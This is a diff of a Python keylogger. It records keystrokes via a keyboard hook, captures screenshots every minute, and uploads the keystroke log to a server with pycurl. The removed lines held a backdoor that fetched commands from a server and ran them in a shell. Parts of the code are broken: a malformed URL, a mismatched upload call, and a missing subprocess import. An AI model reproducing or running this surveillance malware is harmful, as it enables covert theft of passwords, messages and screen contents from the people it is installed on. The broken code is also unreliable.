@@ -1,12 +1,12 @@
-import random 
+import random
 import threading
 import pyHook
 import gtk.gdk
 import urllib2, urllib
 import pycurl
 import cStringIO
-import json
-import subprocess
+import os
+from time import time
 
 def OnKeyboardEvent(event):
     
@@ -21,14 +21,37 @@ def OnKeyboardEvent(event):
     else:
         text = chr(event.Ascii)
     fob = open('log.txt', 'a')
-    doPost();
     
     fob.write(text)
     fob.close()
+
+    
     return True
 
+def getFileSize(file_name):
+   return os.path.getsize(file_name)
+def getServerUrl():
+    return "http;//localhost/t.php"
+
+
+def threadFunctions():
+    threading.Timer(60.0, threadFunctions).start()
+    captureImage()
+    checkLogfile()
+
+def checkLogfile():
+    size = getFileSize('log.txt')
+    if size>20000:
+        if uploadFile('log.txt'):
+            name = time()
+            name = str(name)+".txt"
+            os.rename('log.txt',name)
+
+
+
+
+
 def captureImage():
-    threading.Timer(60.0, captureImage).start()
     w = gtk.gdk.get_default_root_window()
     sz = w.get_size()
     pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
@@ -37,17 +60,6 @@ def captureImage():
         name = random.getrandbits(32)
         name = str(name)+".png"
         pb.save(name,"png")
-    checkRemoteServer()
-        
-def checkRemoteServer():
-    req_url = makeFullUrl()
-    data = urllib2.urlopen(req_url).read()
-    data_json = json.loads(data)
-    if data_json['batch'] == "true":
-        result = executeBatchScript(data_json['command'])
-        print result
-      
-
 
 def getRandomString():
      seed = random.getrandbits(32)
@@ -57,7 +69,6 @@ def executeBatchScript(command):
         result = subprocess.check_output(command, shell=True)
     except subprocess.CalledProcessError as error:
         print("Error: Command exited with code {0}".format(error.returncode))
-    return result    
 def doPost(post_url):
     
     mydata=[('one','1'),('two','2')]    #The first is the var name the second is the value
@@ -68,20 +79,16 @@ def doPost(post_url):
     page=urllib2.urlopen(req).read()
     print page 
 def uploadFile(url,filename):
+    url = getServerUrl();
     response = cStringIO.StringIO()
     c = pycurl.Curl()
     c.setopt(c.POST, 1)
     c.setopt(c.URL, url)
     c.setopt(c.HTTPPOST, [("file", (c.FORM_FILE, filename))])
-# c.setopt(pycurl.HTTPPOST, [('file', (pycurl.FORM_FILE, file_path, pycurl.FORM_FILENAME, filename))])
     c.setopt(c.VERBOSE, 1)
     c.setopt(c.WRITEFUNCTION, response.write)
     c.perform()
-    c.close()
-def makeFullUrl():
-    host = "http://localhost/"
-    return host+"php.php"    
-                    
+    c.close()            
                
     
 hm = pyHook.HookManager()
